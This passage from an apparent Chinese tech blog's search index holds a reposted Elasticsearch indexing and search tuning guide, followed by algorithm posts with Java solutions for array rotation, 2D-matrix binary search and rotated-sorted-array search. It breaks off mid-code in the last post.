10GB的内存，它会给索引缓冲区1GB，这足以承载两个索引很重的分片。</p><ol><li>禁用_field_names字段<br>_field_names字段引入了一些索引时间开销，所以如果您不需要运行存在查询，您可能需要禁用它。<br>_field_names：<a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/mapping-field-names-field.html%EF%BC%89" target="_blank" rel="noopener">field_names</a></li><li>剩下的，再去看看 “调优磁盘使用”吧<br> 磁盘使用：<a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/tune-for-disk-usage.html%EF%BC%89%E4%B8%AD%E6%9C%89%E8%AE%B8%E5%A4%9A%E7%A3%81%E7%9B%98%E4%BD%BF%E7%94%A8%E7%AD%96%E7%95%A5%E4%B9%9F%E6%8F%90%E9%AB%98%E4%BA%86%E7%B4%A2%E5%BC%95%E9%80%9F%E5%BA%A6%E3%80%82" target="_blank" rel="noopener">磁盘使用</a></li></ol><h2 id="第二部分：调优搜索速度"><a href="#第二部分：调优搜索速度" class="headerlink" title="第二部分：调优搜索速度"></a>第二部分：调优搜索速度</h2><h3 id="1-filesystem-cache越大越好"><a href="#1-filesystem-cache越大越好" class="headerlink" title="1. filesystem cache越大越好"></a>1. filesystem cache越大越好</h3><p>   为了使得搜索速度更快， es严重依赖filesystem cache<br>   一般来说，需要至少一半的 可用内存 作为filesystem cache，这样es可以在物理内存中 保有 索引的热点区域（hot regions of the index）</p><h3 id="2-用更好的硬件"><a href="#2-用更好的硬件" class="headerlink" title="2. 用更好的硬件"></a>2. 用更好的硬件</h3><p>   搜索一般是I/O bound的，此时，你需要<br>   a.为filesystem cache分配更多的内存<br>   b.使用SSD硬盘<br>   c.使用local storage（不要使用NFS、SMB 等remote filesystem）<br>   d.亚马逊的 弹性块存储（Elastic Block Storage）也是极好的，当然，和local storage比起来，它还是要慢点<br>   如果你的搜索是 CPU-bound，买好的CPU吧</p><h3 id="3-文档模型（document-modeling）"><a href="#3-文档模型（document-modeling）" class="headerlink" title="3. 文档模型（document modeling）"></a>3. 文档模型（document modeling）</h3><p>   文档需要使用合适的类型，从而使得 search-time operations 消耗更少的资源。咋作呢？<br>   答：避免 join操作。具体是指<br>   a.nested 会使得查询慢 好几倍<br>   b.parent-child关系 更是使得查询慢几百倍<br>   如果 无需join 能解决问题，则查询速度会快很多</p><h3 id="4-预索引-数据"><a href="#4-预索引-数据" class="headerlink" title="4. 预索引 数据"></a>4. 预索引 数据</h3><p>   根据“搜索数据最常用的方式”来最优化索引数据的方式<br>   举个例子：<br>   所有文档都有price字段，大部分query 在 fixed ranges 上运行 range aggregation。你可以把给定范围的数据 预先索引下。然后，使用 terms aggregation</p><h3 id="5-Mappings（能用-keyword-最好了）"><a href="#5-Mappings（能用-keyword-最好了）" class="headerlink" title="5. Mappings（能用 keyword 最好了）"></a>5. Mappings（能用 keyword 最好了）</h3><p>   数字类型的数据，并不意味着一定非得使用numeric类型的字段。<br>   一般来说，存储标识符的 字段（书号ISBN、或来自数据库的 标识一条记录的 数字），使用keyword更好（integer，long 不好哦，亲）<br>   6.避免运行脚本<br>   一般来说，脚本应该避免。 如果他们是绝对需要的，你应该使用painless和expressions引擎。</p><h3 id="6-搜索rounded日期"><a href="#6-搜索rounded日期" class="headerlink" title="6. 搜索rounded日期"></a>6. 搜索rounded日期</h3><p>   日期字段上使用now，一般来说不会被缓存。但，rounded date则可以利用上query cache<br>   rounded到分钟等</p><h3 id="7-强制merge只读的index"><a href="#7-强制merge只读的index" class="headerlink" title="7. 强制merge只读的index"></a>7. 强制merge只读的index</h3><p>   只读的index可以从“merge成 一个单独的 大segment”中收益</p><h3 id="8-预热-全局序数（global-ordinals）"><a href="#8-预热-全局序数（global-ordinals）" class="headerlink" title="8. 预热 全局序数（global ordinals）"></a>8. 预热 全局序数（global ordinals）</h3><p>   全局序数 用于 在 keyword字段上 运行 terms aggregations<br>   es不知道 哪些fields 将 用于/不用于 term aggregation，因此 全局序数 在需要时才加载进内存<br>   但，可以在mapping type上，定义 eager_global_ordinals==true，这样，refresh时就会加载 全局序数</p><h3 id="9-预热-filesystem-cache"><a href="#9-预热-filesystem-cache" class="headerlink" title="9. 预热 filesystem cache"></a>9. 预热 filesystem cache</h3><p>   机器重启时，filesystem cache就被清空。OS将index的热点区域（hot regions of the index）加载进filesystem cache是需要花费一段时间的。<br>   设置 index.store.preload 可以告知OS 这些文件需要提早加载进入内存</p><h3 id="10-使用索引排序来加速连接"><a href="#10-使用索引排序来加速连接" class="headerlink" title="10. 使用索引排序来加速连接"></a>10. 使用索引排序来加速连接</h3><p>索引排序对于以较慢的索引为代价来加快连接速度非常有用。在索引分类文档中阅读更多关于它的信息。</p><h3 id="11-使用preference来优化高速缓存利用率"><a href="#11-使用preference来优化高速缓存利用率" class="headerlink" title="11. 使用preference来优化高速缓存利用率"></a>11. 使用preference来优化高速缓存利用率</h3><p>有多个缓存可以帮助提高搜索性能，例如文件系统缓存，请求缓存或查询缓存。然而，所有这些缓存都维护在节点级别，这意味着如果连续运行两次相同的请求，则有一个或多个副本，并使用循环（默认路由算法），那么这两个请求将转到不同的分片副本，阻止节点级别的缓存帮助。</p><p>由于搜索应用程序的用户一个接一个地运行类似的请求是常见的，例如为了分析索引的较窄的子集，使用标识当前用户或会话的优选值可以帮助优化高速缓存的使用。</p><h3 id="12-副本可能有助于吞吐量，但不会一直存在"><a href="#12-副本可能有助于吞吐量，但不会一直存在" class="headerlink" title="12. 副本可能有助于吞吐量，但不会一直存在"></a>12. 副本可能有助于吞吐量，但不会一直存在</h3><p>除了提高弹性外，副本可以帮助提高吞吐量。例如，如果您有单个分片索引和三个节点，则需要将副本数设置为2，以便共有3个分片副本，以便使用所有节点。</p><p>现在假设你有一个2-shards索引和两个节点。在一种情况下，副本的数量是0，这意味着每个节点拥有一个分片。在第二种情况下，副本的数量是1，这意味着每个节点都有两个碎片。哪个设置在搜索性能方面表现最好？通常情况下，每个节点的碎片数少的设置将会更好。原因在于它将可用文件系统缓存的份额提高到了每个碎片，而文件系统缓存可能是Elasticsearch的1号性能因子。同时，要注意，没有副本的设置在发生单个节点故障的情况下会出现故障，因此在吞吐量和可用性之间进行权衡。</p><p>那么复制品的数量是多少？如果您有一个具有num_nodes节点的群集，那么num_primaries总共是主分片，如果您希望能够一次处理max_failures节点故障，那么正确的副本数是max（max_failures，ceil（num_nodes / num_primaries） - 1）。</p><h3 id="13-打开自适应副本选择"><a href="#13-打开自适应副本选择" class="headerlink" title="13. 打开自适应副本选择"></a>13. 打开自适应副本选择</h3><p>当存在多个数据副本时，elasticsearch可以使用一组称为自适应副本选择的标准，根据包含分片的每个副本的节点的响应时间，服务时间和队列大小来选择数据的最佳副本。这可以提高查询吞吐量并减少搜索量大的应用程序的延迟。</p><h2 id="第三部分：通用的一些建议"><a href="#第三部分：通用的一些建议" class="headerlink" title="第三部分：通用的一些建议"></a>第三部分：通用的一些建议</h2><h3 id="1、不要返回大的结果集"><a href="#1、不要返回大的结果集" class="headerlink" title="1、不要返回大的结果集"></a>1、不要返回大的结果集</h3><p>es设计来作为搜索引擎，它非常擅长返回匹配query的top n文档。但，如“返回满足某个query的 所有文档”等数据库领域的工作，并不是es最擅长的领域。如果你确实需要返回所有文档，你可以使用Scroll API</p><h3 id="2、避免大的doc。即单个doc小了会更好"><a href="#2、避免大的doc。即单个doc小了会更好" class="headerlink" title="2、避免大的doc。即单个doc小了会更好"></a>2、避免大的doc。即单个doc小了会更好</h3><p>given that(考虑到) http.max_context_length默认==100MB，es拒绝索引操作100MB的文档。当然你可以提高这个限制，但，Lucene本身也有限制的，其为2GB<br>即使不考虑上面的限制，大的doc 会给 network/memory/disk带来更大的压力；<br>a.任何搜索请求，都需要获取 _id 字段，由于filesystem cache工作方式。即使它不请求 _source字段，获取大doc _id 字段消耗更大<br>b.索引大doc时消耗内存会是 doc本身大小 的好几倍<br>c.大doc的 proximity search, highlighting 也更加昂贵。它们的消耗直接取决于doc本身的大小</p><h3 id="3、避免稀疏"><a href="#3、避免稀疏" class="headerlink" title="3、避免稀疏"></a>3、避免稀疏</h3><p>a.不相关数据 不要 放入同一个索引<br>b.一般化文档结构（Normalize document structures）<br>c.避免类型<br>d.在 稀疏 字段上，禁用 norms &amp; doc_values 属性</p><h4 id="稀疏为什么不好？"><a href="#稀疏为什么不好？" class="headerlink" title="稀疏为什么不好？"></a>稀疏为什么不好？</h4><p>Lucene背后的数据结构 更擅长处理 紧凑的数据<br>text类型的字段，norms默认开启；numerics, date, ip, keyword，doc_values默认开启<br>Lucene内部使用 integer的doc_id来标识文档 和 内部API交互。<br>举个例子：<br>使用match查询时生成doc_id的迭代器，这些doc_id被用于获取它们的norm，以便计算score。当前的实现是每个doc中保留一个byte用于存储norm值。获取norm值其实就是读取doc_id位置处的一个字节<br>这非常高效，Lucene通过此值可以快速访问任何一个doc的norm值；但，给定一个doc，即使某个field没有值，仍需要为此doc的此field保留一个字节<br>doc_values也有同样的问题。2.0之前的fielddata被现在的doc_values所替代了。<br>稀疏性 最明显的影响是 对存储的需求（任何doc的每个field，都需要一个byte）；但是呢，稀疏性 对 索引速度和查询速度 也是有影响的，因为：即使doc并没有某些字段值，但，索引时，依然需要写这些字段，查询时，需要skip这些字段的值<br>某个索引中拥有少量稀疏字段，这完全没有问题。但，这不应该成为常态<br>稀疏性影响最大的是 norms&amp;doc_values ，但，倒排索引（用于索引 text以及keyword字段），二维点（用于索引geo_point字段）也会受到较小的影响</p><h4 id="如何避免稀疏呢？"><a href="#如何避免稀疏呢？" class="headerlink" title="如何避免稀疏呢？"></a>如何避免稀疏呢？</h4><p>1、不相关数据 不要 放入同一个索引<br>给个tip：索引小（即：doc的个数较少），则，primary shard也要少<br>2、一般化文档结构（Normalize document structures）<br>3、避免类型（Avoid mapping type）<br>同一个index，最好就一个mapping type<br>在同一个index下面，使用不同的mapping type来存储数据，听起来不错，但，其实不好。given that(考虑到)每一个mapping type会把数据存入 同一个index，因此，多个不同mapping type，各个的field又互不相同，这同样带来了稀疏性 问题<br>4、在 稀疏 字段上，禁用 norms &amp; doc_values 属性<br>a.norms用于计算score，无需score，则可以禁用它（所有filtering字段，都可以禁用norms）<br>b.doc_vlaues用于sort&amp;aggregations，无需这两个，则可以禁用它<br>但是，不要轻率的做出决定，因为 norms&amp;doc_values无法修改。只能reindex</p><p>秘诀1：混合 精确查询和提取词干（mixing exact search with stemming）<br>对于搜索应用，提取词干（stemming）都是必须的。例如：查询 skiing时，ski和skis都是期望的结果<br>但，如果用户就是要查询skiing呢？<br>解决方法是：使用multi-field。同一份内容，以两种不同的方式来索引存储<br>query.simple_query_string.quote_field_suffix，竟然是 查询完全匹配的</p><p>秘诀2：获取一致性的打分<br>score不能重现<br>同一个请求，连续运行2次，但，两次返回的文档顺序不一致。这是相当坏的用户体验</p><p>如果存在 replica，则就可能发生这种事，这是因为：<br>search时，replication group中的shard是按round-robin方式来选择的，因此两次运行同样的请求，请求如果打到 replication group中的不同shard，则两次得分就可能不一致</p><p>那问题来了，“你不是整天说 primary和replica是in-sync的，是完全一致的”嘛，为啥打到“in-sync的，完全一致的shard”却算出不同的得分？</p><p>原因就是标注为“已删除”的文档。如你所知，doc更新或删除时，旧doc并不删除，而是标注为“已删除”，只有等到 旧doc所在的segment被merge时，“已删除”的doc才会从磁盘删除掉</p><p>索引统计（index statistic）是打分时非常重要的一部分，但，由于 deleted doc 的存在，在同一个shard的不同copy（即：各个replica）上 计算出的 索引统计 并不一致</p><p>个人理解：<br>a. 所谓 索引统计 应该就是df，即 doc_freq<br>b. 索引统计 是基于shard来计算的</p><ol><li>搜索时，“已删除”的doc 当然是 永远不会 出现在 结果集中的</li><li>索引统计时，for practical reasons，“已删除”doc 依然是统计在内的</li></ol><p>假设，shard A0 刚刚完成了一次较大的segment merge，然后移除了很多“已删除”doc，shard A1 尚未执行 segment merge，因此 A1 依然存在那些“已删除”doc</p><p>于是：两次请求打到 A0 和 A1 时，两者的 索引统计 是显著不同的</p><p>如何规避 score不能重现 的问题？使用 preference 查询参数<br>发出搜索请求时候，用 标识字符串 来标识用户，将 标识字符串 作为查询请求的preference参数。这确保多次执行同一个请求时候，给定用户的请求总是达到同一个shard，因此得分会更为一致（当然，即使同一个shard，两次请求 跨了 segment merge，则依然会得分不一致）<br>这个方式还有另外一个优点，当两个doc得分一致时，则默认按着doc的 内部Lucene doc id 来排序（注意：这并不是es中的 _id 或 _uid）。但是呢，shard的不同copy间，同一个doc的 内部Lucene doc id 可能并不相同。因此，如果总是达到同一个shard，则，具有相同得分的两个doc，其顺序是一致的score错了（Relevancy looks wrong）</p><p>如果你发现</p><ol><li>具有相同内容的文档，其得分不同</li><li>完全匹配 的查询 并没有排在第一位<br>这可能都是由 sharding 引起的</li><li>默认情况下，搜索文档时，每个shard自己计算出自己的得分。</li><li>索引统计 又是打分时一个非常重要的因素。</li></ol><p>如果每个shard的 索引统计相似，则 搜索工作的很好<br>文档是平分到每个primary shard的，因此 索引统计 会非常相似，打分也会按着预期工作。但，万事都有个但是：</p><ol><li>索引时使用了 routing（文档不能平分到每个primary shard 啦）</li><li>查询多个索引</li><li>索引中文档的个数 非常少<br>这会导致：参与查询的各个shard，各自的 索引统计 并不相似（而，索引统计对 最终的得分 又影响巨大），于是 打分出错了（relevancy looks wrong）</li></ol><p>那，如何绕过 score错了（Relevancy looks wrong）？</p><p>如果数据集较小，则，只使用一个primary shard（es默认是5个），这样两次查询 索引统计 不会变化，因而得分也就一致啦<br>另一种方式是，将search_type设置为：dfs_query_then_fetech（默认是query_then_fetch）<br>dfs_query_then_fetch的作用是</p><ol><li>向 所有相关shard 发出请求，要求 所有相关shard 返回针对当前查询的 索引统计</li><li>然后，coordinating node 将 merge这些 索引统计，从而得到 merged statistics</li><li>coordinating node 要求 所有相关shard 执行 query phase，于是 发出请求，这时，也带上 merged statistics。这样，执行query的shard 将使用 全局的索引统计大部分情况下，要求 所有相关shard 返回针对当前查询的 索引统计，这是非常cheap的。但，如果查询中 包含 非常大量的 字段/term查询，或者有 fuzzy查询，此时，获取 索引统计 可能并不cheap，因为 为了得到 索引统计 可能 term dictionary 中 所有的term都需要被查询一遍</li></ol><p>转载自：<a href="http://wangnan.tech/post/elasticsearch-how-to/" target="_blank" rel="noopener">原文</a></p>]]></content>
      
      
      <categories>
          
          <category> ElasticSearch </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ElasticSearch </tag>
            
            <tag> 搜索引擎 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>旋转数组</title>
      <link href="/2019/01/06/suan-fa/shu-zu/xuan-zhuan-shu-zu/"/>
      <url>/2019/01/06/suan-fa/shu-zu/xuan-zhuan-shu-zu/</url>
      
        <content type="html"><![CDATA[<h2 id="旋转数组"><a href="#旋转数组" class="headerlink" title="旋转数组"></a>旋转数组</h2><p><strong>问题</strong></p><p>这个题目说的是，给你一个数组和一个数字 k，你要把数组右边的数字旋转到数组左边，一次旋转一个数字，共旋转 k 次。</p><pre><code>比如说，给你的数组是：0, 1, 2, 4, 8给你的数字 k 是 3：k = 3把数组右边的数字一个个旋转到左边，操作 3 次。先是 8，然后 4，最后是 2。剩下的 0 和 1 保持不动。最后得到旋转后的数组是：2, 4, 8, 0, 1</code></pre><p><strong>代码</strong></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AlgoCasts</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// Time: O(n), Space: O(n)</span>  <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">rotateByCopy</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> nums<span class="token punctuation">,</span> <span class="token keyword">int</span> k<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>nums <span class="token operator">==</span> null <span class="token operator">||</span> nums<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">||</span> k <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span>length<span class="token punctuation">,</span> m <span class="token operator">=</span> k <span class="token operator">%</span> n<span class="token punctuation">,</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> t <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">int</span><span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> n<span class="token operator">-</span>m<span class="token punctuation">;</span> j <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> t<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> n<span class="token operator">-</span>m<span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> t<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> t<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">reverse</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> nums<span class="token punctuation">,</span> <span class="token keyword">int</span> i<span class="token punctuation">,</span> <span class="token keyword">int</span> j<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> j<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">,</span> <span class="token operator">--</span>j<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">int</span> tmp <span class="token operator">=</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>      nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>      nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> tmp<span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// Time: O(n), Space: O(1)</span>  <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">rotateBySwap</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> nums<span class="token punctuation">,</span> <span class="token keyword">int</span> k<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>nums <span class="token operator">==</span> null <span class="token operator">||</span> nums<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">||</span> k <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span>length<span class="token punctuation">,</span> m <span class="token operator">=</span> k <span class="token operator">%</span> n<span class="token punctuation">;</span>    <span class="token function">reverse</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">reverse</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> m<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">reverse</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> m<span class="token punctuation">,</span> n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> 数组 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>二维数组的二分搜索</title>
      <link href="/2019/01/06/suan-fa/shu-zu/er-wei-shu-zu-de-er-fen-sou-suo/"/>
      <url>/2019/01/06/suan-fa/shu-zu/er-wei-shu-zu-de-er-fen-sou-suo/</url>
      
        <content type="html"><![CDATA[<h2 id="二维数组的二分搜索"><a href="#二维数组的二分搜索" class="headerlink" title="二维数组的二分搜索"></a>二维数组的二分搜索</h2><p><strong>问题</strong></p><p>这个题目说的是，给你一个二维数组 matrix，和一个目标值 target。你要在数组里找到这个目标值，然后返回它的行/列下标。如果找不到，则返回 [-1,-1]。</p><p>这个数组的每一行都是递增的，<strong>并且每一行的第一个数都比上一行的最后一个数要大</strong>。也就是，这个数组可以看成，从左到右、从上到下，呈 Z 字形递增。</p><pre class=" language-markdown"><code class="language-markdown">比如说，给你的二维数组是：1, 3, 57, 9, 11给你的目标值是 9。9 在这个数组中，找到后返回它的下标 [1, 1] 即可。如果给你的目标值是 100。显然它不在这个二维数组中，你要返回 [-1，-1]。</code></pre><p><strong>代码</strong></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AlgoCasts</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// Time: O(log(m*n)), Space: O(1)</span>  <span class="token keyword">public</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">binarySearchIn2DArray</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> matrix<span class="token punctuation">,</span> <span class="token keyword">int</span> target<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>matrix <span class="token operator">==</span> null <span class="token operator">||</span> matrix<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">||</span>      matrix<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> null <span class="token operator">||</span> matrix<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>      <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> m <span class="token operator">=</span> matrix<span class="token punctuation">.</span>length<span class="token punctuation">,</span> n <span class="token operator">=</span> matrix<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>length<span class="token punctuation">;</span>    <span class="token keyword">int</span> low <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> high <span class="token operator">=</span> m <span class="token operator">*</span> n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>low <span class="token operator">&lt;=</span> high<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">int</span> mid <span class="token operator">=</span> low <span class="token operator">+</span> <span class="token punctuation">(</span>high <span class="token operator">-</span> low<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>      <span class="token keyword">int</span> r <span class="token operator">=</span> mid <span class="token operator">/</span> n<span class="token punctuation">,</span> c <span class="token operator">=</span> mid <span class="token operator">%</span> n<span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>target <span class="token operator">&lt;</span> matrix<span class="token punctuation">[</span>r<span class="token punctuation">]</span><span class="token punctuation">[</span>c<span class="token punctuation">]</span><span class="token punctuation">)</span> high <span class="token operator">=</span> mid <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>      <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>target <span class="token operator">></span> matrix<span class="token punctuation">[</span>r<span class="token punctuation">]</span><span class="token punctuation">[</span>c<span class="token punctuation">]</span><span class="token punctuation">)</span> low <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>      <span class="token keyword">else</span> <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>r<span class="token punctuation">,</span> c<span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> 数组 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>旋转有序数组的搜索</title>
      <link href="/2019/01/06/suan-fa/shu-zu/xuan-zhuan-you-xu-shu-zu-de-sou-suo/"/>
      <url>/2019/01/06/suan-fa/shu-zu/xuan-zhuan-you-xu-shu-zu-de-sou-suo/</url>
      
        <content type="html"><![CDATA[<h2 id="旋转有序数组的搜索"><a href="#旋转有序数组的搜索" class="headerlink" title="旋转有序数组的搜索"></a>旋转有序数组的搜索</h2><p><strong>问题</strong></p><p>这个题目说的是，给你一个旋转有序的整数数组，和一个目标值，你要在数组里找到目标值，然后返回它的下标。如果找不到则返回 -1。注意：数组中不存在重复数字。旋转有序数组是由一个原来有序的数组通过左旋或右旋部分数字到另一端形成的。注意，这里我们讨论的有序默认都指递增排序。</p><pre><code>比如说，原来的有序数组是：1, 2, 3, 4, 5, 6, 7, 8把 1, 2, 3, 4 旋转到数组右边，得到的数组 a 是：5, 6, 7, 8, 1, 2, 3, 4假如给你的目标值是 6，则要返回它的下标 1；假如给你的目标值是 0，0 不在这个数组中，因此返回 -1。</code></pre><p><strong>代码</strong></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AlgoCasts</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// Time: O(log(n)), Space: O(1)</span>  <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">searchInRotatedSortedArray</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> nums<span class="token punctuation">,</span> <span class="token keyword">int</span> target<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>nums <span class="token operator">==</span> null <span class="token operator">||</span> nums<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> low <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> high <span class="token operator">=</span> nums<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>low <span class="token operator">&lt;=</span> high<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">int</span> mid <span class="token operator">=</span> low <span class="token operator">+</span> <span class="token punctuation">(</span>high <span class="token operator">-</span> low<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>target <span class="token operator">==</span> nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">return</span> mid<span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span> <span class="token operator">>=</span> nums<span class="token punctuation">[</span>low<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>target <span class="token operator">&lt;</span> nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> target <span class="token operator">>=</span> nums<span class="token punctuation">[</span>low<span class="token punctuation">]</span><span class="token punctuation">)</span> high <span class="token operator">=</span> mid <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">else</span> low <span class="token operator">=</span> 